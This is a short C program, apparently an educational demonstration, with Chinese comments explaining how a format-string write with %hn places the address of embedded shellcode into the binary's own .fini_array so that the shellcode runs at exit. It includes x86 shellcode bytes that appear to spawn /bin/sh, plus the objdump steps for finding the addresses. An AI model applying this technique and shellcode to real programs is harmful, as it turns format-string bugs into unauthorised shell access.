/*
 * new_shell.c
 * Authored by Liu Peng on: Fri Nov 28 14:32:11 CST 2014
 * 创建一个新的shell 在gcc version 4.7.2 (Debian 4.7.2-5)编译器
 * 以及
 * @desc: 调用printf函数将shellcode的内存地址(FUNCTION_ADDR)写入到.fini_array中
 	  .fini_array的地址为DESTADDR
 *	  .fini_array通过访问该内存地址， 执行该shellcode
 *	  FUNCTION_ADDR、DESTADDR的值需通过将本程序编译之后才可确定, 意味着本程序
 	  不可移植
 * @func:获取FUNCTION_ADDR、DESTADDR
 	 gcc new_shell.c -o new_shell
	 objdump -d 找到main中调用printf函数时传入的最后一个参数作为FUNCTION_ADDR
	 objdump -h -j .fini_array new_shell 找到VMA字段， 作为 DESTADDR 
**/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
 
#define FUNCTION_ADDR ((uint32_t)0x08048500 + 12)
#define DESTADDR 0x080495c0
#define a (FUNCTION_ADDR & 0xffff)
#define b ((FUNCTION_ADDR >> 16) & 0xffff)
 
int main(int argc, char *argv[])
{
   printf("%*c%hn%*c%hn"
	"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
	"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
	"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
	"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
	"\x89\xe3\x31\xc9\xcd\x80"
, b, 0, DESTADDR + 2, a-b, 0, DESTADDR );
}
